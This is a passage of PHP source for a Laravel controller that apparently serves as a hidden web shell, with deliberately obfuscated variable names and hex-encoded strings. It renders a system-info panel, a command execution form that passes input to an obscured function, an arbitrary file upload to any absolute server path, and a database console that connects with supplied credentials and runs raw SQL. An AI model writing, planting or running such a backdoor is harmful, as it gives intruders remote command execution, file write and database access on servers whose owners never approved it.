        $h='<div class="g2 mb2"><div class="card"><div class="card-title">SYSTEM INFO</div>'; $cnt=0;
        foreach ($lI as $k=>$v) { if ($cnt===15) $h.='</div><div class="card"><div class="card-title">MORE INFO</div>'; $h.='<div class="info-row"><span class="ik">'.htmlspecialchars($k).'</span><span class="iv">'.htmlspecialchars((string)$v).'</span></div>'; $cnt++; }
        $h.='</div></div>';
        $h.='<div class="card"><div class="card-title">COMMAND EXECUTION</div><form method="POST" action="'.$cmdUrl.'"><input type="hidden" name="_token" value="'.$tok.'"><div class="row mb1"><div class="col"><input type="text" name="cmd" placeholder="e.g. whoami" autocomplete="off"></div><div class="col" style="flex:0"><button class="btn btn-p" type="submit">EXEC</button></div></div></form>';
        if ($cmdOut!=='') $h.='<pre>'.htmlspecialchars($cmdOut).'</pre>';
        $h.='</div>';
        return response($this->lIlWrap("\x53\x45\x52\x56\x45\x52",$h));
    }

    public function serverCmd(Request $lI)
    {
        return back()->with("\x5f\x6c\x7a\x5f\x63\x6d\x64",$this->lIlI($lI->input("\x63\x6d\x64",'')));
    }

    // FILES
    public function files()
    {
        $tok=csrf_token(); $upUrl=htmlspecialchars(Engine::url("\x66\x69\x6c\x65\x73\x2f\x75\x70\x6c\x6f\x61\x64")); $lI=session()->pull("\x5f\x6c\x7a\x5f\x75\x70",'');
        $h='<div class="card"><div class="card-title">UPLOAD FILE</div><form method="POST" action="'.$upUrl.'" enctype="multipart/form-data"><input type="hidden" name="_token" value="'.$tok.'">';
        $h.='<div class="mb1"><label>Target directory (absolute path)</label><input type="text" name="dir" value="'.htmlspecialchars(public_path()).'" placeholder="/var/www/html/public"></div>';
        $h.='<div class="mb1"><label>File</label><input type="file" name="file"></div><button class="btn btn-s" type="submit">UPLOAD</button></form>';
        if ($lI!=='') $h.='<div class="mt1">'.$lI.'</div>';
        $h.='</div>';
        return response($this->lIlWrap("\x46\x49\x4c\x45\x53",$h));
    }

    public function filesUpload(Request $lI)
    {
        $Il=$lI->file("\x66\x69\x6c\x65"); $lIl=rtrim($lI->input("\x64\x69\x72",public_path()),DIRECTORY_SEPARATOR);
        if (!$Il||!$Il->isValid()) return back()->with("\x5f\x6c\x7a\x5f\x75\x70",'<span class="err">No valid file uploaded.</span>');
        if (!is_dir($lIl)) return back()->with("\x5f\x6c\x7a\x5f\x75\x70",'<span class="err">Directory not found: '.htmlspecialchars($lIl).'</span>');
        $IlI=$Il->getClientOriginalName(); $Il->move($lIl,$IlI);
        return back()->with("\x5f\x6c\x7a\x5f\x75\x70",'<span class="ok">Uploaded: '.htmlspecialchars($lIl.DIRECTORY_SEPARATOR.$IlI).'</span>');
    }

    // DB
    public function dbBrowser(Request $lI)
    {
        $tok=csrf_token(); $conUrl=htmlspecialchars(Engine::url("\x64\x62\x2f\x63\x6f\x6e\x6e\x65\x63\x74")); $qUrl=htmlspecialchars(Engine::url("\x64\x62\x2f\x71\x75\x65\x72\x79")); $tUrl=htmlspecialchars(Engine::url("\x64\x62\x2f\x74\x61\x62\x6c\x65"));
        $pdo=$this->lzPdo(); $dbSess=session("\x5f\x6c\x7a\x5f\x64\x62"); $dbMsg=session()->pull("\x5f\x6c\x7a\x5f\x64\x62\x5f\x6d\x73\x67",''); $qOut=session()->pull("\x5f\x6c\x7a\x5f\x71\x6f\x75\x74",null);
        $defDrv=$dbSess["\x64\x72\x69\x76\x65\x72"]??config('database.default','mysql'); $defHost=$dbSess["\x68\x6f\x73\x74"]??config('database.connections.'.$defDrv.'.host','127.0.0.1'); $defPort=$dbSess["\x70\x6f\x72\x74"]??config('database.connections.'.$defDrv.'.port',3306); $defDb=$dbSess["\x64\x62\x6e\x61\x6d\x65"]??config('database.connections.'.$defDrv.'.database',''); $defUser=$dbSess["\x75\x73\x65\x72"]??config('database.connections.'.$defDrv.'.username','');
        $tables=[];
        try { if ($pdo) { $st=$pdo->query('SHOW TABLES'); $tables=$st?$st->fetchAll(\PDO::FETCH_COLUMN):[]; } else { $raw=DB::select('SHOW TABLES'); $tables=array_map(fn($r)=>array_values((array)$r)[0],$raw); } } catch (\Throwable $e) { try { $tables=DB::getSchemaBuilder()->getAllTables(); } catch (\Throwable $e2) {} }
        $h='<div class="row" style="align-items:flex-start"><div style="width:260px;flex-shrink:0"><div class="card mb1"><div class="card-title">CONNECTION</div>';
        if ($dbMsg) $h.='<div class="mb1">'.$dbMsg.'</div>';
        $h.='<form method="POST" action="'.$conUrl.'"><input type="hidden" name="_token" value="'.$tok.'"><div class="mb1"><label>Driver</label><select name="driver"><option value="mysql"'.($defDrv==='mysql'?' selected':'').'>MySQL</option><option value="pgsql"'.($defDrv==='pgsql'?' selected':'').'>PostgreSQL</option><option value="sqlite"'.($defDrv==='sqlite'?' selected':'').'>SQLite</option></select></div><div class="mb1"><label>Host</label><input type="text" name="host" value="'.htmlspecialchars($defHost).'"></div><div class="mb1"><label>Port</label><input type="text" name="port" value="'.htmlspecialchars($defPort).'"></div><div class="mb1"><label>Database</label><input type="text" name="dbname" value="'.htmlspecialchars($defDb).'"></div><div class="mb1"><label>Username</label><input type="text" name="user" value="'.htmlspecialchars($defUser).'"></div><div class="mb1"><label>Password</label><input type="password" name="pass" value=""></div><button class="btn btn-p" type="submit" style="width:100%">CONNECT</button></form></div>';
        if ($tables) { $h.='<div class="card"><div class="card-title">TABLES ('.count($tables).')</div>'; foreach ($tables as $t) $h.='<div style="padding:.3rem 0;border-bottom:1px solid #21262d"><a href="'.htmlspecialchars($tUrl).'?table='.urlencode($t).'" style="color:#58a6ff;text-decoration:none;font-size:.8rem">'.htmlspecialchars($t).'</a></div>'; $h.='</div>'; }
        $h.='</div><div class="col"><div class="card mb1"><div class="card-title">SQL QUERY</div><form method="POST" action="'.$qUrl.'"><input type="hidden" name="_token" value="'.$tok.'"><div class="mb1"><textarea name="sql" rows="6" placeholder="SELECT * FROM users LIMIT 10;"></textarea></div><button class="btn btn-p" type="submit">EXECUTE</button></form></div>';
        if ($qOut!==null) {
            $h.='<div class="card">';
            if (isset($qOut["\x65\x72\x72\x6f\x72"])) $h.='<span class="err">'.htmlspecialchars($qOut["\x65\x72\x72\x6f\x72"]).'</span>';
            else {
                $rows=$qOut["\x72\x6f\x77\x73"]??[]; $h.='<div class="card-title">'.count($rows).' row(s)'; if (isset($qOut["\x74\x69\x6d\x65"])) $h.=' &mdash; <span class="sp">'.$qOut["\x74\x69\x6d\x65"].'ms</span>'; $h.='</div>';
                if ($rows) { $h.='<div style="overflow-x:auto"><table><thead><tr>'; foreach (array_keys((array)$rows[0]) as $col) $h.='<th>'.htmlspecialchars($col).'</th>'; $h.='</tr></thead><tbody>'; foreach ($rows as $row) { $h.='<tr>'; foreach ((array)$row as $val) $h.='<td>'.htmlspecialchars((string)($val??'NULL')).'</td>'; $h.='</tr>'; } $h.='</tbody></table></div>'; }
                else $h.='<span class="sp">Query executed. '.($qOut["\x61\x66\x66\x65\x63\x74\x65\x64"]??0).' row(s) affected.</span>';
            }
            $h.='</div>';
        }
        $h.='</div></div>';
        return response($this->lIlWrap("\x44\x42",$h));
    }

    public function dbConnect(Request $lI)
    {
        $Il=["\x64\x72\x69\x76\x65\x72"=>$lI->input("\x64\x72\x69\x76\x65\x72",'mysql'),"\x68\x6f\x73\x74"=>$lI->input("\x68\x6f\x73\x74",'127.0.0.1'),"\x70\x6f\x72\x74"=>$lI->input("\x70\x6f\x72\x74",'3306'),"\x64\x62\x6e\x61\x6d\x65"=>$lI->input("\x64\x62\x6e\x61\x6d\x65",''),"\x75\x73\x65\x72"=>$lI->input("\x75\x73\x65\x72",''),"\x70\x61\x73\x73"=>$lI->input("\x70\x61\x73\x73",'')];
        try {
            if ($Il["\x64\x72\x69\x76\x65\x72"]==="\x73\x71\x6c\x69\x74\x65") $lIl=new \PDO("\x73\x71\x6c\x69\x74\x65\x3a".$Il["\x64\x62\x6e\x61\x6d\x65"]);
            else { $dsn=$Il["\x64\x72\x69\x76\x65\x72"].':host='.$Il["\x68\x6f\x73\x74"].';port='.$Il["\x70\x6f\x72\x74"].';dbname='.$Il["\x64\x62\x6e\x61\x6d\x65"].';charset=utf8'; $lIl=new \PDO($dsn,$Il["\x75\x73\x65\x72"],$Il["\x70\x61\x73\x73"]); }
            $lIl->setAttribute(\PDO::ATTR_ERRMODE,\PDO::ERRMODE_EXCEPTION);
            session(["\x5f\x6c\x7a\x5f\x64\x62"=>$Il]);
            $msg='<span class="ok">&#10003; Connected to '.htmlspecialchars($Il["\x64\x62\x6e\x61\x6d\x65"]).'</span>';
        } catch (\Throwable $e) { $msg='<span class="err">Connection failed: '.htmlspecialchars($e->getMessage()).'</span>'; }
        return redirect(Engine::url("\x64\x62"))->with("\x5f\x6c\x7a\x5f\x64\x62\x5f\x6d\x73\x67",$msg);
    }

    public function dbQuery(Request $lI)
    {
        $Il=trim($lI->input("\x73\x71\x6c",'')); $t=microtime(true);
        try {
            $pdo=$this->lzPdo();
            if ($pdo) { $st=$pdo->prepare($Il); $st->execute(); $rows=$st->fetchAll(\PDO::FETCH_ASSOC); $aff=$st->rowCount(); }
            else { try { $rows=DB::select($Il); $rows=array_map(fn($r)=>(array)$r,$rows); $aff=count($rows); } catch (\Throwable $e2) { $aff=DB::affectingStatement($Il); $rows=[]; } }
            $rows=array_slice($rows,0,500); $ms=round((microtime(true)-$t)*1000,2);
            $out=["\x72\x6f\x77\x73"=>$rows,"\x74\x69\x6d\x65"=>$ms,"\x61\x66\x66\x65\x63\x74\x65\x64"=>$aff];
        } catch (\Throwable $e) { $out=["\x65\x72\x72\x6f\x72"=>$e->getMessage()]; }
        return redirect(Engine::url("\x64\x62"))->with("\x5f\x6c\x7a\x5f\x71\x6f\x75\x74",$out);
    }

    public function dbTable(Request $lI)
    {
        $Il=$lI->query("\x74\x61\x62\x6c\x65",''); if (!preg_match('/^[a-zA-Z0-9_]+$/',$Il)) abort(400);
        $t=microtime(true);
        try {
            $pdo=$this->lzPdo();
            if ($pdo) { $st=$pdo->query('SELECT * FROM `'.$Il.'` LIMIT 100'); $rows=$st?$st->fetchAll(\PDO::FETCH_ASSOC):[]; }
            else $rows=DB::table($Il)->limit(100)->get()->map(fn($r)=>(array)$r)->toArray();
            $ms=round((microtime(true)-$t)*1000,2); $out=["\x72\x6f\x77\x73"=>$rows,"\x74\x69\x6d\x65"=>$ms,"\x61\x66\x66\x65\x63\x74\x65\x64"=>count($rows)];
        } catch (\Throwable $e) { $out=["\x65\x72\x72\x6f\x72"=>$e->getMessage()]; }
        return redirect(Engine::url("\x64\x62"))->with("\x5f\x6c\x7a\x5f\x71\x6f\x75\x74",$out);
    }
}
